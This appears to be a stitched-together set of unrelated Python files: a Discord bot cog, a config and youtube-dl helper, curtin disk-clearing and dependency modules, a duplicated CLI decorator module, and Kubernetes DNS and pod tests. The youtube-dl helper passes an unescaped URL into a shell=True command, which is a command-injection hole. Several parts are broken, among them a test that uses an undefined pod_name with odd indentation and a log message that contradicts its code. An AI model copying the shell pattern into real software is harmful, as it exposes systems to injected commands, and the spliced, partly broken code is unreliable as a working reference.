                lambda c: not c.qualified_name.startswith('sudo'),
                self.bot.walk_commands()
            )
        )

        command = random.choice(command_choice)
        return self.bot.change_presence(
            game=discord.Game(
                name=f'for {self.bot.command_prefix}{command.qualified_name}',
                type=3
            )
        )

    async def activity_update_loop(self):
        """Handles changing the status every 20 seconds."""
        with await self.running_lock:
            while True:
                try:
                    await self.next_activity()
                except BaseException:
                    pass
                else:
                    await asyncio.sleep(20)

    async def on_ready(self):
        """On ready, if we are not already running a loop, invoke a new one."""

        # Delay on_ready for a couple of seconds to ensure the previous
        # message had time to show.
        await asyncio.sleep(2)

        # First say "READY!" for 10 seconds.
        await self.bot.change_presence(
            game=discord.Game(name='READY!'),
            status=discord.Status
        )

        await asyncio.sleep(10)

        if not self.running_lock.locked():
            asyncio.ensure_future(self.activity_update_loop())

    async def on_connect(self):
        """When we connect to Discord, show the game as listening to Gateway"""
        try:
            # I like random snippets of data.
            # noinspection PyProtectedMember
            gateway = self.bot.ws._trace[0]
        except IndexError:
            gateway = 'the gateway'

        await self.bot.change_presence(
            game=discord.Game(name=gateway, type=2),
            status=discord.Status.dnd
        )


def setup(bot):
    """Adds the help cog to the bot."""
    HelpCog.mksetup()(bot)
    ActivityChangerCog.mksetup()(bot)

import glob
import logging
import os
import subprocess
from ConfigParser import ConfigParser

try:
    CONFIG_INI = os.path.abspath(glob.glob('mindfulness_config.ini')[0])
except:
    # try default path
    CONFIG_INI = '/opt/mindfulness/mindfulness_config.ini'


def read_config(section):
    parser = ConfigParser()
    parser.read(CONFIG_INI)
    config_params = {param[0]: param[1] for param in parser.items(section)}
    logging.info("Loaded %d parameters for section %s", len(config_params), section)
    return config_params


def remove_commas_from_string(input_string):
    return str(input_string).translate(None, ',')


def get_title_from_youtube_url(url):
    try:
        output = str(subprocess.check_output('youtube-dl --get-title %s --no-warnings' % url, stderr=subprocess.STDOUT,                    
                                             shell=True)).strip()                    
    except subprocess.CalledProcessError as ex:
        output = str(ex.output).strip()
    except OSError as ex:
        output = 'youtube-dl not found: %s' % ex
    except Exception as ex:
        output = 'Something bad happened: %s' % ex
    return remove_commas_from_string(output)


BASE_PATH = read_config('general')['path']

# This file is part of curtin. See LICENSE file for copyright and license info.

"""
This module provides a mechanism for shutting down virtual storage layers on
top of a block device, making it possible to reuse the block device without
having to reboot the system
"""

import errno
import os
import time

from curtin import (block, udev, util)
from curtin.block import lvm
from curtin.block import mdadm
from curtin.log import LOG

# poll frequenty, but wait up to 60 seconds total
MDADM_RELEASE_RETRIES = [0.4] * 150


def _define_handlers_registry():
    """
    returns instantiated dev_types
    """
    return {
        'partition': {'shutdown': wipe_superblock,
                      'ident': identify_partition},
        'lvm': {'shutdown': shutdown_lvm, 'ident': identify_lvm},
        'crypt': {'shutdown': shutdown_crypt, 'ident': identify_crypt},
        'raid': {'shutdown': shutdown_mdadm, 'ident': identify_mdadm},
        'bcache': {'shutdown': shutdown_bcache, 'ident': identify_bcache},
        'disk': {'ident': lambda x: False, 'shutdown': wipe_superblock},
    }


def get_dmsetup_uuid(device):
    """
    get the dm uuid for a specified dmsetup device
    """
    blockdev = block.sysfs_to_devpath(device)
    (out, _) = util.subp(['dmsetup', 'info', blockdev, '-C', '-o', 'uuid',
                          '--noheadings'], capture=True)
    return out.strip()


def get_bcache_using_dev(device, strict=True):
    """
    Get the /sys/fs/bcache/ path of the bcache cache device bound to
    specified device
    """
    # FIXME: when block.bcache is written this should be moved there
    sysfs_path = block.sys_block_path(device)
    path = os.path.realpath(os.path.join(sysfs_path, 'bcache', 'cache'))
    if strict and not os.path.exists(path):
        err = OSError(
            "device '{}' did not have existing syspath '{}'".format(
                device, path))
        err.errno = errno.ENOENT
        raise err

    return path


def get_bcache_sys_path(device, strict=True):
    """
    Get the /sys/class/block/<device>/bcache path
    """
    sysfs_path = block.sys_block_path(device, strict=strict)
    path = os.path.join(sysfs_path, 'bcache')
    if strict and not os.path.exists(path):
        err = OSError(
            "device '{}' did not have existing syspath '{}'".format(
                device, path))
        err.errno = errno.ENOENT
        raise err

    return path


def maybe_stop_bcache_device(device):
    """Attempt to stop the provided device_path or raise unexpected errors."""
    bcache_stop = os.path.join(device, 'stop')
    try:
        util.write_file(bcache_stop, '1', mode=None)
    except (IOError, OSError) as e:
        # Note: if we get any exceptions in the above exception classes
        # it is a result of attempting to write "1" into the sysfs path
        # The range of errors changes depending on when we race with
        # the kernel asynchronously removing the sysfs path. Therefore
        # we log the exception errno we got, but do not re-raise as
        # the calling process is watching whether the same sysfs path
        # is being removed;  if it fails to go away then we'll have
        # a log of the exceptions to debug.
        LOG.debug('Error writing to bcache stop file %s, device removed: %s',
                  bcache_stop, e)


def shutdown_bcache(device):
    """
    Shut down bcache for specified bcache device

    1. Stop the cacheset that `device` is connected to
    2. Stop the 'device'
    """
    if not device.startswith('/sys/class/block'):
        raise ValueError('Invalid Device (%s): '
                         'Device path must start with /sys/class/block/',
                         device)

    # bcache device removal should be fast but in an extreme
    # case, might require the cache device to flush large
    # amounts of data to a backing device.  The strategy here
    # is to wait for approximately 30 seconds but to check
    # frequently since curtin cannot proceed until devices
    # cleared.
    removal_retries = [0.2] * 150  # 30 seconds total
    bcache_shutdown_message = ('shutdown_bcache running on {} has determined '
                               'that the device has already been shut down '
                               'during handling of another bcache dev. '
                               'skipping'.format(device))

    if not os.path.exists(device):
        LOG.info(bcache_shutdown_message)
        return

    # get slaves [vdb1, vdc], allow for slaves to not have bcache dir
    slave_paths = [get_bcache_sys_path(k, strict=False) for k in
                   os.listdir(os.path.join(device, 'slaves'))]

    # stop cacheset if it exists
    bcache_cache_sysfs = get_bcache_using_dev(device, strict=False)
    if not os.path.exists(bcache_cache_sysfs):
        LOG.info('bcache cacheset already removed: %s',
                 os.path.basename(bcache_cache_sysfs))
    else:
        LOG.info('stopping bcache cacheset at: %s', bcache_cache_sysfs)
        maybe_stop_bcache_device(bcache_cache_sysfs)
        try:
            util.wait_for_removal(bcache_cache_sysfs, retries=removal_retries)
        except OSError:
            LOG.info('Failed to stop bcache cacheset %s', bcache_cache_sysfs)
            raise

        # let kernel settle before the next remove
        udev.udevadm_settle()

    # after stopping cache set, we may need to stop the device
    # both the dev and sysfs entry should be gone.

    # we know the bcacheN device is really gone when we've removed:
    #  /sys/class/block/{bcacheN}
    #  /sys/class/block/slaveN1/bcache
    #  /sys/class/block/slaveN2/bcache
    bcache_block_sysfs = get_bcache_sys_path(device, strict=False)
    to_check = [device] + slave_paths
    found_devs = [os.path.exists(p) for p in to_check]
    LOG.debug('os.path.exists on blockdevs:\n%s',
              list(zip(to_check, found_devs)))
    if not any(found_devs):
        LOG.info('bcache backing device already removed: %s (%s)',
                 bcache_block_sysfs, device)
        LOG.debug('bcache slave paths checked: %s', slave_paths)
        return
    else:
        LOG.info('stopping bcache backing device at: %s', bcache_block_sysfs)
        maybe_stop_bcache_device(bcache_block_sysfs)
        try:
            # wait for them all to go away
            for dev in [device, bcache_block_sysfs] + slave_paths:
                util.wait_for_removal(dev, retries=removal_retries)
        except OSError:
            LOG.info('Failed to stop bcache backing device %s',
                     bcache_block_sysfs)
            raise

    return


def shutdown_lvm(device):
    """
    Shutdown specified lvm device.
    """
    device = block.sys_block_path(device)
    # lvm devices have a dm directory that containes a file 'name' containing
    # '{volume group}-{logical volume}'. The volume can be freed using lvremove
    name_file = os.path.join(device, 'dm', 'name')
    (vg_name, lv_name) = lvm.split_lvm_name(util.load_file(name_file))
    # use two --force flags here in case the volume group that this lv is
    # attached two has been damaged
    LOG.debug('running lvremove on %s/%s', vg_name, lv_name)
    util.subp(['lvremove', '--force', '--force',
               '{}/{}'.format(vg_name, lv_name)], rcs=[0, 5])
    # if that was the last lvol in the volgroup, get rid of volgroup
    if len(lvm.get_lvols_in_volgroup(vg_name)) == 0:
        util.subp(['vgremove', '--force', '--force', vg_name], rcs=[0, 5])
    # refresh lvmetad
    lvm.lvm_scan()


def shutdown_crypt(device):
    """
    Shutdown specified cryptsetup device
    """
    blockdev = block.sysfs_to_devpath(device)
    util.subp(['cryptsetup', 'remove', blockdev], capture=True)


def shutdown_mdadm(device):
    """
    Shutdown specified mdadm device.
    """
    blockdev = block.sysfs_to_devpath(device)
    LOG.debug('using mdadm.mdadm_stop on dev: %s', blockdev)
    mdadm.mdadm_stop(blockdev)

    # mdadm stop operation is asynchronous so we must wait for the kernel to
    # release resources. For more details see  LP: #1682456
    try:
        for wait in MDADM_RELEASE_RETRIES:
            if mdadm.md_present(block.path_to_kname(blockdev)):
                time.sleep(wait)
            else:
                LOG.debug('%s has been removed', blockdev)
                break

        if mdadm.md_present(block.path_to_kname(blockdev)):
            raise OSError('Timeout exceeded for removal of %s', blockdev)

    except OSError:
        LOG.critical('Failed to stop mdadm device %s', device)
        if os.path.exists('/proc/mdstat'):
            LOG.critical("/proc/mdstat:\n%s", util.load_file('/proc/mdstat'))
        raise


def wipe_superblock(device):
    """
    Wrapper for block.wipe_volume compatible with shutdown function interface
    """
    blockdev = block.sysfs_to_devpath(device)
    # when operating on a disk that used to have a dos part table with an
    # extended partition, attempting to wipe the extended partition will fail
    if block.is_extended_partition(blockdev):
        LOG.info("extended partitions do not need wiping, so skipping: '%s'",
                 blockdev)
    else:
        # some volumes will be claimed by the bcache layer but do not surface
        # an actual /dev/bcacheN device which owns the parts (backing, cache)
        # The result is that some volumes cannot be wiped while bcache claims
        # the device.  Resolve this by stopping bcache layer on those volumes
        # if present.
        for bcache_path in ['bcache', 'bcache/set']:
            stop_path = os.path.join(device, bcache_path)
            if os.path.exists(stop_path):
                LOG.debug('Attempting to release bcache layer from device: %s',
                          device)
                maybe_stop_bcache_device(stop_path)
                continue

        retries = [1, 3, 5, 7]
        LOG.info('wiping superblock on %s', blockdev)
        for attempt, wait in enumerate(retries):
            LOG.debug('wiping %s attempt %s/%s',
                      blockdev, attempt + 1, len(retries))
            try:
                block.wipe_volume(blockdev, mode='superblock')
                LOG.debug('successfully wiped device %s on attempt %s/%s',
                          blockdev, attempt + 1, len(retries))
                return
            except OSError:
                if attempt + 1 >= len(retries):
                    raise
                else:
                    LOG.debug("wiping device '%s' failed on attempt"
                              " %s/%s.  sleeping %ss before retry",
                              blockdev, attempt + 1, len(retries), wait)
                    time.sleep(wait)


def identify_lvm(device):
    """
    determine if specified device is a lvm device
    """
    return (block.path_to_kname(device).startswith('dm') and
            get_dmsetup_uuid(device).startswith('LVM'))


def identify_crypt(device):
    """
    determine if specified device is dm-crypt device
    """
    return (block.path_to_kname(device).startswith('dm') and
            get_dmsetup_uuid(device).startswith('CRYPT'))


def identify_mdadm(device):
    """
    determine if specified device is a mdadm device
    """
    return block.path_to_kname(device).startswith('md')


def identify_bcache(device):
    """
    determine if specified device is a bcache device
    """
    return block.path_to_kname(device).startswith('bcache')


def identify_partition(device):
    """
    determine if specified device is a partition
    """
    path = os.path.join(block.sys_block_path(device), 'partition')
    return os.path.exists(path)


def get_holders(device):
    """
    Look up any block device holders, return list of knames
    """
    # block.sys_block_path works when given a /sys or /dev path
    sysfs_path = block.sys_block_path(device)
    # get holders
    holders = os.listdir(os.path.join(sysfs_path, 'holders'))
    LOG.debug("devname '%s' had holders: %s", device, holders)
    return holders


def gen_holders_tree(device):
    """
    generate a tree representing the current storage hirearchy above 'device'
    """
    device = block.sys_block_path(device)
    dev_name = block.path_to_kname(device)
    # the holders for a device should consist of the devices in the holders/
    # dir in sysfs and any partitions on the device. this ensures that a
    # storage tree starting from a disk will include all devices holding the
    # disk's partitions
    holder_paths = ([block.sys_block_path(h) for h in get_holders(device)] +
                    block.get_sysfs_partitions(device))
    # the DEV_TYPE registry contains a function under the key 'ident' for each
    # device type entry that returns true if the device passed to it is of the
    # correct type. there should never be a situation in which multiple
    # identify functions return true. therefore, it will always work to take
    # the device type with the first identify function that returns true as the
    # device type for the current device. in the event that no identify
    # functions return true, the device will be treated as a disk
    # (DEFAULT_DEV_TYPE). the identify function for disk never returns true.
    # the next() builtin in python will not raise a StopIteration exception if
    # there is a default value defined
    dev_type = next((k for k, v in DEV_TYPES.items() if v['ident'](device)),
                    DEFAULT_DEV_TYPE)
    return {
        'device': device, 'dev_type': dev_type, 'name': dev_name,
        'holders': [gen_holders_tree(h) for h in holder_paths],
    }


def plan_shutdown_holder_trees(holders_trees):
    """
    plan best order to shut down holders in, taking into account high level
    storage layers that may have many devices below them

    returns a sorted list of descriptions of storage config entries including
    their path in /sys/block and their dev type

    can accept either a single storage tree or a list of storage trees assumed
    to start at an equal place in storage hirearchy (i.e. a list of trees
    starting from disk)
    """
    # holds a temporary registry of holders to allow cross references
    # key = device sysfs path, value = {} of priority level, shutdown function
    reg = {}

    # normalize to list of trees
    if not isinstance(holders_trees, (list, tuple)):
        holders_trees = [holders_trees]

    def flatten_holders_tree(tree, level=0):
        """
        add entries from holders tree to registry with level key corresponding
        to how many layers from raw disks the current device is at
        """
        device = tree['device']

        # always go with highest level if current device has been
        # encountered already. since the device and everything above it is
        # re-added to the registry it ensures that any increase of level
        # required here will propagate down the tree
        # this handles a scenario like mdadm + bcache, where the backing
        # device for bcache is a 3nd level item like mdadm, but the cache
        # device is 1st level (disk) or second level (partition), ensuring
        # that the bcache item is always considered higher level than
        # anything else regardless of whether it was added to the tree via
        # the cache device or backing device first
        if device in reg:
            level = max(reg[device]['level'], level)

        reg[device] = {'level': level, 'device': device,
                       'dev_type': tree['dev_type']}

        # handle holders above this level
        for holder in tree['holders']:
            flatten_holders_tree(holder, level=level + 1)

    # flatten the holders tree into the registry
    for holders_tree in holders_trees:
        flatten_holders_tree(holders_tree)

    # return list of entry dicts with highest level first
    return [reg[k] for k in sorted(reg, key=lambda x: reg[x]['level'] * -1)]


def format_holders_tree(holders_tree):
    """
    draw a nice dirgram of the holders tree
    """
    # spacer styles based on output of 'tree --charset=ascii'
    spacers = (('`-- ', ' ' * 4), ('|-- ', '|' + ' ' * 3))

    def format_tree(tree):
        """
        format entry and any subentries
        """
        result = [tree['name']]
        holders = tree['holders']
        for (holder_no, holder) in enumerate(holders):
            spacer_style = spacers[min(len(holders) - (holder_no + 1), 1)]
            subtree_lines = format_tree(holder)
            for (line_no, line) in enumerate(subtree_lines):
                result.append(spacer_style[min(line_no, 1)] + line)
        return result

    return '\n'.join(format_tree(holders_tree))


def get_holder_types(tree):
    """
    get flattened list of types of holders in holders tree and the devices
    they correspond to
    """
    types = {(tree['dev_type'], tree['device'])}
    for holder in tree['holders']:
        types.update(get_holder_types(holder))
    return types


def assert_clear(base_paths):
    """
    Check if all paths in base_paths are clear to use
    """
    valid = ('disk', 'partition')
    if not isinstance(base_paths, (list, tuple)):
        base_paths = [base_paths]
    base_paths = [block.sys_block_path(path) for path in base_paths]
    for holders_tree in [gen_holders_tree(p) for p in base_paths]:
        if any(holder_type not in valid and path not in base_paths
               for (holder_type, path) in get_holder_types(holders_tree)):
            raise OSError('Storage not clear, remaining:\n{}'
                          .format(format_holders_tree(holders_tree)))


def clear_holders(base_paths, try_preserve=False):
    """
    Clear all storage layers depending on the devices specified in 'base_paths'
    A single device or list of devices can be specified.
    Device paths can be specified either as paths in /dev or /sys/block
    Will throw OSError if any holders could not be shut down
    """
    # handle single path
    if not isinstance(base_paths, (list, tuple)):
        base_paths = [base_paths]

    # get current holders and plan how to shut them down
    holder_trees = [gen_holders_tree(path) for path in base_paths]
    LOG.info('Current device storage tree:\n%s',
             '\n'.join(format_holders_tree(tree) for tree in holder_trees))
    ordered_devs = plan_shutdown_holder_trees(holder_trees)

    # run shutdown functions
    for dev_info in ordered_devs:
        dev_type = DEV_TYPES.get(dev_info['dev_type'])
        shutdown_function = dev_type.get('shutdown')
        if not shutdown_function:
            continue
        if try_preserve and shutdown_function in DATA_DESTROYING_HANDLERS:
            LOG.info('shutdown function for holder type: %s is destructive. '
                     'attempting to preserve data, so not skipping' %
                     dev_info['dev_type'])
            continue
        LOG.info("shutdown running on holder type: '%s' syspath: '%s'",
                 dev_info['dev_type'], dev_info['device'])
        shutdown_function(dev_info['device'])
        udev.udevadm_settle()


def start_clear_holders_deps():
    """
    prepare system for clear holders to be able to scan old devices
    """
    # a mdadm scan has to be started in case there is a md device that needs to
    # be detected. if the scan fails, it is either because there are no mdadm
    # devices on the system, or because there is a mdadm device in a damaged
    # state that could not be started. due to the nature of mdadm tools, it is
    # difficult to know which is the case. if any errors did occur, then ignore
    # them, since no action needs to be taken if there were no mdadm devices on
    # the system, and in the case where there is some mdadm metadata on a disk,
    # but there was not enough to start the array, the call to wipe_volume on
    # all disks and partitions should be sufficient to remove the mdadm
    # metadata
    mdadm.mdadm_assemble(scan=True, ignore_errors=True)
    # the bcache module needs to be present to properly detect bcache devs
    # on some systems (precise without hwe kernel) it may not be possible to
    # lad the bcache module bcause it is not present in the kernel. if this
    # happens then there is no need to halt installation, as the bcache devices
    # will never appear and will never prevent the disk from being reformatted
    util.subp(['modprobe', 'bcache'], rcs=[0, 1])                    


# anything that is not identified can assumed to be a 'disk' or similar
DEFAULT_DEV_TYPE = 'disk'
# handlers that should not be run if an attempt is being made to preserve data
DATA_DESTROYING_HANDLERS = [wipe_superblock]
# types of devices that could be encountered by clear holders and functions to
# identify them and shut them down
DEV_TYPES = _define_handlers_registry()

# vi: ts=4 expandtab syntax=python

# This file is part of curtin. See LICENSE file for copyright and license info.

import os
import sys

from curtin.util import (
    ProcessExecutionError,
    get_architecture,
    install_packages,
    is_uefi_bootable,
    lsb_release,
    which,
)

REQUIRED_IMPORTS = [
    # import string to execute, python2 package, python3 package
    ('import yaml', 'python-yaml', 'python3-yaml'),
]

REQUIRED_EXECUTABLES = [
    # executable in PATH, package
    ('file', 'file'),
    ('lvcreate', 'lvm2'),
    ('mdadm', 'mdadm'),
    ('mkfs.vfat', 'dosfstools'),
    ('mkfs.btrfs', 'btrfs-tools'),
    ('mkfs.ext4', 'e2fsprogs'),
    ('mkfs.xfs', 'xfsprogs'),
    ('partprobe', 'parted'),
    ('sgdisk', 'gdisk'),
    ('udevadm', 'udev'),
    ('make-bcache', 'bcache-tools'),
    ('iscsiadm', 'open-iscsi'),
]

if lsb_release()['codename'] == "precise":
    REQUIRED_IMPORTS.append(
        ('import oauth.oauth', 'python-oauth', None),)
else:
    REQUIRED_IMPORTS.append(
        ('import oauthlib.oauth1', 'python-oauthlib', 'python3-oauthlib'),)

if not is_uefi_bootable() and 'arm' in get_architecture():
    REQUIRED_EXECUTABLES.append(('flash-kernel', 'flash-kernel'))


class MissingDeps(Exception):
    def __init__(self, message, deps):
        self.message = message
        if isinstance(deps, str) or deps is None:
            deps = [deps]
        self.deps = [d for d in deps if d is not None]
        self.fatal = None in deps

    def __str__(self):
        if self.fatal:
            if not len(self.deps):
                return self.message + " Unresolvable."
            return (self.message +
                    " Unresolvable.  Partially resolvable with packages: %s" %
                    ' '.join(self.deps))
        else:
            return self.message + " Install packages: %s" % ' '.join(self.deps)


def check_import(imports, py2pkgs, py3pkgs, message=None):
    import_group = imports
    if isinstance(import_group, str):
        import_group = [import_group]

    for istr in import_group:
        try:
            exec(istr)
            return
        except ImportError:
            pass

    if not message:
        if isinstance(imports, str):
            message = "Failed '%s'." % imports
        else:
            message = "Unable to do any of %s." % import_group

    if sys.version_info[0] == 2:
        pkgs = py2pkgs
    else:
        pkgs = py3pkgs

    raise MissingDeps(message, pkgs)


def check_executable(cmdname, pkg):
    if not which(cmdname):
        raise MissingDeps("Missing program '%s'." % cmdname, pkg)


def check_executables(executables=None):
    if executables is None:
        executables = REQUIRED_EXECUTABLES
    mdeps = []
    for exe, pkg in executables:
        try:
            check_executable(exe, pkg)
        except MissingDeps as e:
            mdeps.append(e)
    return mdeps


def check_imports(imports=None):
    if imports is None:
        imports = REQUIRED_IMPORTS

    mdeps = []
    for import_str, py2pkg, py3pkg in imports:
        try:
            check_import(import_str, py2pkg, py3pkg)
        except MissingDeps as e:
            mdeps.append(e)
    return mdeps


def find_missing_deps():
    return check_executables() + check_imports()                    


def install_deps(verbosity=False, dry_run=False, allow_daemons=True):
    errors = find_missing_deps()
    if len(errors) == 0:
        if verbosity:
            sys.stderr.write("No missing dependencies\n")
        return 0

    missing_pkgs = []
    for e in errors:
        missing_pkgs += e.deps

    deps_string = ' '.join(sorted(missing_pkgs))

    if dry_run:
        sys.stderr.write("Missing dependencies: %s\n" % deps_string)
        return 0

    if os.geteuid() != 0:
        sys.stderr.write("Missing dependencies: %s\n" % deps_string)
        sys.stderr.write("Package installation is not possible as non-root.\n")
        return 2

    if verbosity:
        sys.stderr.write("Installing %s\n" % deps_string)

    ret = 0
    try:
        install_packages(missing_pkgs, allow_daemons=allow_daemons,
                         aptopts=["--no-install-recommends"])
    except ProcessExecutionError as e:
        sys.stderr.write("%s\n" % e)
        ret = e.exit_code

    return ret

# vi: ts=4 expandtab syntax=python


import re
import readline
from functools import wraps
import shlex

from color import prnt, VIOLET, RED


class CmdError(Exception):
    pass


def command(func):
    @wraps(func)
    def cmd_trycatch(self, arg):
        args = shlex.split(arg, comments=True)                    
        try:
            func(self, args)
        except CmdError as e:
            prnt("Error: {}.".format(str(e)), RED)
            prnt("Command details:", RED)
            prnt("\tCommand:\n\t\t->\"{}\"".format(pure_cmd_name(func)), RED)
            prnt("\tArgument string:\n\t\t->\"{}\"".format(arg), RED)
    return cmd_trycatch


def state(func):
    @wraps(func)
    def set_state(self, args):
        self.state.set_state(func(self, args))

    return set_state


def emptystate(func):
    @wraps(func)
    def set_state(self, args):
        self.state.clear_state()
        func(self, args)

    return set_state


class arglen:
    def __init__(self, min, max=None):
        self.min = min
        if not max:
            self.max = self.min
        else:
            self.max = max

    def __call__(self, func):
        @wraps(func)
        def arglen_check(func_self, args):
            if self.min <= len(args) and len(args) <= self.max:
                return func(func_self, args)
            else:
                raise CmdError(
                        "The '{}' command takes between [{}, {}] args"
                        .format(
                            func.__name__.split('_')[1], self.min, self.max
                            )
                        )

        return arglen_check


def _get_pat_and_hint(arg):
    inject_base_pat = '%{}:["]?({})["]?'
    hint_base = '%{}'

    if '%p:' in arg:
        pat = inject_base_pat.format('p', '\d+')
        hint = hint_base.format('p')
    elif '%s:' in arg:
        pat = inject_base_pat.format('s', '.+')
        hint = hint_base.format('s')
    elif '%:' in arg:
        pat = inject_base_pat.format('', '.+')
        hint = hint_base.format('')
    elif '%c:' in arg:
        pat = inject_base_pat.format('c', '')
        hint = hint_base.format('c')
    elif '%cp:' in arg:
        pat = inject_base_pat.format('cp', '\d+')
        hint = hint_base.format('cp')
    else:
        pat, hint = None, None

    return pat, hint


def _inject_id(self, args, i, pat, hint):
    res = re.compile(pat).search(args[i])
    if not res:
        raise CmdError("Invalid substitution argument")
    val = res.group(1)
    inject_id = str(self.state.fetch(val, hint=hint).obj_id)
    args[i] = re.sub(pat, inject_id, args[i])


def inject(func):
    @wraps(func)
    def inject_arg(self, args):
        for i in range(len(args)):
            arg = args[i]
            pat, hint = _get_pat_and_hint(arg)
            if not pat and not hint:
                continue

            _inject_id(self, args, i, pat, hint)

        func(self, args)

    return inject_arg


class restrict:
    def __init__(self, subcmds):
        self.subcmds = subcmds

    def __call__(self, func):
        @wraps(func)
        def restrict_subcmds(func_self, args):
            if args[0] in self.subcmds:
                func(func_self, args)
            else:
                err_msg = "Sub command must be one of: {}".format(self.subcmds)
                raise CmdError(err_msg)

        return restrict_subcmds


def readline_inject(args):
    # Inject into readline to use the injected command.
    history_len = readline.get_current_history_length()
    last_item = readline.get_history_item(history_len)
    cmd = ' '.join([last_item.split()[0]] + args)
    readline.replace_history_item(history_len-1, cmd)


def print_listing(items, pos):
    for offset, item in enumerate(items):
        prnt(pos+offset, '. ', item, VIOLET, None, None)
    return pos + len(items)


def pure_cmd_name(cmd_func):
    return cmd_func.__name__[len('do_'):]

import re
import readline
from functools import wraps
import shlex

from color import prnt, VIOLET, RED


class CmdError(Exception):
    pass


def command(func):
    @wraps(func)
    def cmd_trycatch(self, arg):
        cmds = _decompose(arg)
        if len(cmds) > 1:
            self.cmdqueue.extend(cmds[1:])
        args = shlex.split(cmds[0] if cmds else arg, comments=True)
        try:
            func(self, args)
        except CmdError as e:
            prnt("Error: {}.".format(str(e)), RED)
            prnt("Command details:", RED)
            prnt("\tCommand:\n\t\t->\"{}\"".format(pure_cmd_name(func)), RED)
            prnt("\tArgument string:\n\t\t->\"{}\"".format(arg), RED)
    return cmd_trycatch


def _decompose(line):
    breakpoints = _find_breakpoints(line)
    inclusive_breakpoints = [0] + breakpoints + [len(line)]
    cmds = []
    for i in range(len(breakpoints) + 1):
        start = inclusive_breakpoints[i]
        end = inclusive_breakpoints[i+1]
        cmd = line[start:end]
        if cmd and cmd[0] == ';':  # The first cmd fails this check
            cmd = cmd[1:]
        cmds.append(cmd.strip())
    return cmds


def _find_breakpoints(line):
    breakpoints = []
    in_quote = False
    for i, ch in enumerate(line):
        if ch in ["\"", "'"]:
            in_quote = not in_quote
        if ch == ';' and not in_quote:
            breakpoints.append(i)
        if ch == '#' and not in_quote:
            break  # This is comment territory, ignore everything.
    return breakpoints


def state(func):
    @wraps(func)
    def set_state(self, args):
        self.state.set_state(func(self, args))

    return set_state


def emptystate(func):
    @wraps(func)
    def set_state(self, args):
        self.state.clear_state()
        func(self, args)

    return set_state


class arglen:
    def __init__(self, min, max=None):
        self.min = min
        if not max:
            self.max = self.min
        else:
            self.max = max

    def __call__(self, func):
        @wraps(func)
        def arglen_check(func_self, args):
            if self.min <= len(args) and len(args) <= self.max:
                return func(func_self, args)
            else:
                raise CmdError(
                        "The '{}' command takes between [{}, {}] args"
                        .format(
                            func.__name__.split('_')[1], self.min, self.max
                            )
                        )

        return arglen_check


def _get_pat_and_hint(arg):
    inject_base_pat = '%{}:["]?{}["]?'
    hint_base = '%{}'

    if '%p:' in arg:
        pat = inject_base_pat.format('p', '(\d+)')
        hint = hint_base.format('p')
    elif '%s:' in arg:
        pat = inject_base_pat.format('s', '"(.+)"')
        hint = hint_base.format('s')
    elif '%:' in arg:
        pat = inject_base_pat.format('', '(.+)')
        hint = hint_base.format('')
    elif '%c:' in arg:
        pat = inject_base_pat.format('c', '()')
        hint = hint_base.format('c')
    elif '%cp:' in arg:
        pat = inject_base_pat.format('cp', '(\d+)')
        hint = hint_base.format('cp')
    else:
        pat, hint = None, None

    return pat, hint


def _inject_id(self, args, i, pat, hint):                    
    res = re.compile(pat).search(args[i])
    if not res:
        raise CmdError("Invalid substitution argument")
    val = res.group(1)
    inject_id = str(self.state.fetch(val, hint=hint).obj_id)
    args[i] = re.sub(pat, inject_id, args[i])


def inject(func):
    @wraps(func)
    def inject_arg(self, args):
        for i in range(len(args)):                    
            arg = args[i]                    
            pat, hint = _get_pat_and_hint(arg)                    
            if not pat and not hint:                    
                continue                    

            _inject_id(self, args, i, pat, hint)                    

        func(self, args)

    return inject_arg


class restrict:
    def __init__(self, subcmds):
        self.subcmds = subcmds

    def __call__(self, func):
        @wraps(func)
        def restrict_subcmds(func_self, args):
            if args[0] in self.subcmds:
                func(func_self, args)
            else:
                err_msg = "Sub command must be one of: {}".format(self.subcmds)
                raise CmdError(err_msg)

        return restrict_subcmds


def readline_inject(args):
    # Inject into readline to use the injected command.
    history_len = readline.get_current_history_length()
    last_item = readline.get_history_item(history_len)
    cmd = ' '.join([last_item.split()[0]] + args)
    readline.replace_history_item(history_len-1, cmd)


def print_listing(items, pos):
    for offset, item in enumerate(items):
        prnt(pos+offset, '. ', item, VIOLET, None, None)
    return pos + len(items)


def pure_cmd_name(cmd_func):
    return cmd_func.__name__[len('do_'):]

import os

from kubernetes import client, config
import pytest
from pytest_bdd import scenario, then, parsers
import yaml

from tests import utils


@pytest.fixture
def busybox_pod(kubeconfig):
    config.load_kube_config(config_file=kubeconfig)
    k8s_client = client.CoreV1Api()

    # Create the busybox pod
    pod_manifest = os.path.join(
        os.path.realpath(os.path.dirname(__file__)),
        "files",
        "busybox.yaml"
    )
    with open(pod_manifest, encoding='utf-8') as pod_fd:
        pod_manifest_content = yaml.safe_load(pod_fd)

        k8s_client.create_namespaced_pod(                    
        body=pod_manifest_content, namespace="default"
    )

    # Wait for the busybox to be ready
    def _check_status():
        pod_info = k8s_client.read_namespaced_pod(
            name="busybox",
            namespace="default",
        )
        assert pod_info.status.phase == "Running", (
            "Wrong status for 'busybox' Pod - found {status}"
        ).format(status=pod_info.status.phase)

    utils.retry(_check_status, times=10)

    yield "busybox"

    # Clean-up resources
    k8s_client.delete_namespaced_pod(
        name="busybox",
        namespace="default",
        body=client.V1DeleteOptions(),
    )


# Scenarios
@scenario('../features/dns_resolution.feature', 'check DNS')
def test_dns(host):
    pass


@then(parsers.parse("the hostname '{hostname}' should be resolved"))
def resolve_hostname(busybox_pod, host, hostname):
        with host.sudo():                    
            # test dns resolve
            cmd_nslookup = ("kubectl --kubeconfig=/etc/kubernetes/admin.conf"                    
                            " exec -ti {0} nslookup {1}".format(
                                pod_name,                    
                                hostname))                    
            res = host.run(cmd_nslookup)                    
            assert res.rc == 0, "Cannot resolve {}".format(hostname)                    

import json
import time

import pytest
from pytest_bdd import scenario, then, parsers

from tests import kube_utils
from tests import utils


# Scenarios
@scenario('../features/pods_alive.feature', 'List Pods')
def test_list_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Exec in Pods')
def test_exec_in_pods(host):
    pass


@scenario('../features/pods_alive.feature', 'Expected Pods')
def test_expected_pods(host):
    pass


# Then
@then(parsers.parse(
    "the '{resource}' list should not be "
    "empty in the '{namespace}' namespace"))
def check_resource_list(host, resource, namespace):
    with host.sudo():                    
        cmd = ("kubectl --kubeconfig=/etc/kubernetes/admin.conf"                    
               " get {0} --namespace {1} -o custom-columns=:metadata.name")
        cmd_res = host.check_output(cmd.format(resource, namespace))                    
